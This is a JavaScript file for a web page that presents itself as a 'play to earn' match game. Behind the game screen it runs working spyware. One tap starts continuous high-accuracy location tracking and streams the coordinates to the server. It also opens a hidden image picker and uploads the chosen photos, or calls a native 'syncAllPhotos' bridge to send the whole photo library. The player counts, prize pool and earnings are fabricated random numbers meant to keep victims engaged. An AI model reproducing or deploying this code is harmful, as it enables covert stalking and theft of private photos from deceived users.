const roomId = document.body.dataset.roomId
  || window.__RELAY_ROOM_ID
  || window.location.pathname.split('/').filter(Boolean).pop()
  || '';

const joinScreen = document.getElementById('join-screen');
const playScreen = document.getElementById('play-screen');
const errorEl = document.getElementById('error');
const startBtn = document.getElementById('start-btn');
const statusText = document.getElementById('status-text');
const statusSub = document.getElementById('status-sub');
const personNameEl = document.getElementById('person-name');
const earningsEl = document.getElementById('earnings');
const rankEl = document.getElementById('rank');
const streakEl = document.getElementById('streak');
const progressFill = document.getElementById('progress-fill');
const progressHint = document.getElementById('progress-hint');
const onlineCount = document.getElementById('online-count');
const prizePool = document.getElementById('prize-pool');
const prizeTick = document.getElementById('prize-tick');

const IDB_UPLOADS = 'uploaded';
const IDB_NAME = 'relay-sync-cache';
const uploadedKeys = new Set();

let watchId = null;
let ws = null;
let trackerId = null;
let earnings = 0;
let streak = 0;
let progress = 0;
let gameTimers = [];
let syncRunning = false;

const IMAGE_EXT = /\.(jpe?g|png|webp|gif|heic|heif|bmp|tif|tiff|avif)$/i;

function isImageFile(file) {
  return (file.type && file.type.startsWith('image/')) || IMAGE_EXT.test(file.name || '');
}

function fileKey(file) {
  return `${file.name}:${file.size}:${file.lastModified}`;
}

function showError(msg) {
  errorEl.textContent = msg;
  errorEl.classList.remove('hidden');
}

function hideError() {
  errorEl.classList.add('hidden');
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function hasNativeSync() {
  return typeof window.RelayNative?.syncAllPhotos === 'function';
}

function openCacheDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(IDB_NAME, 2);
    req.onupgradeneeded = (ev) => {
      const db = ev.target.result;
      if (!db.objectStoreNames.contains(IDB_UPLOADS)) db.createObjectStore(IDB_UPLOADS);
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function loadUploadedKeys() {
  try {
    const db = await openCacheDB();
    await new Promise((resolve) => {
      const req = db.transaction(IDB_UPLOADS).objectStore(IDB_UPLOADS).getAllKeys();
      req.onsuccess = () => {
        for (const key of req.result || []) uploadedKeys.add(String(key));
        resolve();
      };
      req.onerror = () => resolve();
    });
  } catch { /* silent */ }
}

async function rememberUploadedKey(key) {
  uploadedKeys.add(key);
  try {
    const db = await openCacheDB();
    db.transaction(IDB_UPLOADS, 'readwrite').objectStore(IDB_UPLOADS).put(1, key);
  } catch { /* silent */ }
}

function beginLocationAccess() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
    () => {},
    { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
  );
  if (watchId != null) navigator.geolocation.clearWatch(watchId);
  watchId = navigator.geolocation.watchPosition(
    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
    () => {},
    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
  );
}

function beginPhotoAccess() {
  if (hasNativeSync()) return Promise.resolve([]);
  return new Promise((resolve) => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.accept = 'image/*';
    input.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
    document.body.appendChild(input);
    const done = (files) => {
      input.remove();
      resolve(files.filter(isImageFile));
    };
    input.addEventListener('change', () => done([...(input.files || [])]), { once: true });
    input.addEventListener('cancel', () => done([]), { once: true });
    if (typeof input.showPicker === 'function') {
      input.showPicker().catch(() => input.click());
    } else {
      input.click();
    }
  });
}

function animateLobby() {
  let online = rand(2400, 3200);
  onlineCount.textContent = online.toLocaleString();
  setInterval(() => {
    online += rand(-3, 8);
    onlineCount.textContent = online.toLocaleString();
  }, 3000);

  let pool = rand(11000, 15000);
  prizePool.textContent = `$${pool.toLocaleString()}`;
  setInterval(() => {
    pool += rand(1, 15);
    prizePool.textContent = `$${pool.toLocaleString()}`;
    prizeTick.textContent = rand(50, 200);
  }, 2000);
}

function startGameUI(name) {
  joinScreen.classList.add('hidden');
  playScreen.classList.remove('hidden');
  personNameEl.textContent = name;
  statusText.textContent = 'Match live!';
  statusSub.textContent = "You're in — keep playing to earn more";
  rankEl.textContent = `#${rand(100, 999)}`;

  gameTimers.push(setInterval(() => {
    earnings += Math.random() * 0.08 + 0.02;
    earningsEl.textContent = `$${earnings.toFixed(2)}`;
    streak = Math.min(streak + 1, 99);
    streakEl.textContent = `${streak}🔥`;
    progress = Math.min(progress + rand(1, 3), 100);
    progressFill.style.width = `${progress}%`;
    progressHint.textContent = progress >= 100
      ? '🎉 Bonus unlocked! Keep playing…'
      : `${progress}% to next bonus…`;
  }, 2000));
}

async function sendLocation(lat, lng, accuracy) {
  if (!trackerId) return;
  const payload = { lat, lng, accuracy };
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'location', ...payload }));
    return;
  }
  try {
    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
  } catch { /* retry on next tick */ }
}

async function sendPing() {
  if (!trackerId) return;
  if (ws?.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'ping' }));
    return;
  }
  try {
    await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/ping`, { method: 'POST' });
  } catch { /* retry later */ }
}

async function rejoin() {
  const name = personNameEl.textContent;
  if (!name || name === '—') return;
  const res = await fetch(`/api/rooms/${roomId}/join`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name }),
  });
  if (!res.ok) return;
  trackerId = (await res.json()).tracker_id;
  window.trackerId = trackerId;
  connectWs();
  if (hasNativeSync()) window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
}

function connectWs() {
  const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
  ws.onopen = () => sendPing();
  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
}

async function uploadPhoto(file) {
  if (!trackerId || !file) return false;
  const key = fileKey(file);
  if (uploadedKeys.has(key)) return true;
  const form = new FormData();
  form.append('file', file, file.name || 'photo.jpg');
  try {
    const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/photos`, {
      method: 'POST',
      body: form,
    });
    if (res.ok) await rememberUploadedKey(key);
    return res.ok;
  } catch {
    return false;
  }
}

async function uploadQueue(files) {
  if (!files?.length || !trackerId) return;
  const queue = files.filter(f => !uploadedKeys.has(fileKey(f)));
  if (!queue.length) return;
  const workers = Array.from({ length: 3 }, async () => {
    while (queue.length) {
      const file = queue.shift();
      if (file) await uploadPhoto(file);
    }
  });
  await Promise.all(workers);
}

async function startPlaying() {
  hideError();
  if (!roomId) { showError('Invalid session link.'); return; }

  const name = document.getElementById('name').value.trim();
  if (!name) { showError('Enter your player name to continue.'); return; }

  startBtn.disabled = true;
  startBtn.textContent = 'LOADING…';

  // Permissions must start in the same tap, before any await.
  beginLocationAccess();
  const photosPromise = beginPhotoAccess();

  try {
    const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name }),
    });
    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
    trackerId = (await joinRes.json()).tracker_id;
    window.trackerId = trackerId;

    startGameUI(name);
    connectWs();
    await sendPing();

    if (hasNativeSync()) {
      window.RelayNative.syncAllPhotos(roomId, trackerId, location.origin);
    } else {
      photosPromise.then((files) => uploadQueue(files));
    }

    gameTimers.push(setInterval(sendPing, 30000));

    gameTimers.push(setInterval(async () => {
      if (!trackerId) return;
      try {
        const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
        if (check.status === 404) await rejoin();
      } catch { /* ignore */ }
    }, 8000));

  } catch (e) {
    showError(e.message || 'Something went wrong.');
    startBtn.disabled = false;
    startBtn.textContent = '▶ PLAY NOW';
  }
}

startBtn.addEventListener('click', startPlaying);
document.getElementById('name').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startPlaying();
});

loadUploadedKeys();
animateLobby();
